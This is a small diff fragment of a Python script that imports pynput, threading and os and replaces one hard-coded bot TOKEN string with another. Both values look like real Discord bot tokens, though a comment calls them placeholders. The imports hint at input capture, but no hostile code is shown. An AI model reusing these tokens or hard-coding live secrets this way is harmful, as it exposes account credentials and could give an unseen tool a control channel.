@@ -6,7 +6,7 @@ import pynput
 import threading
 import os
 
-TOKEN = "MTI1Njg3MDU4ODYzMTIyMDMyNg.GsUV_q.87EDxFTDKMVjanLkwrTxR9yV2f-68PdtyIJdyI"  # Placeholder for the actual token
+TOKEN = "MTI1Njg3MjI2NDQ5MDgxNTU2MA.Gs5Ovt.rB2h4QSV8q48LpnOyCdZjChaZ5ytbPyZPe5aAQ"  # Placeholder for the actual token
 
 
 
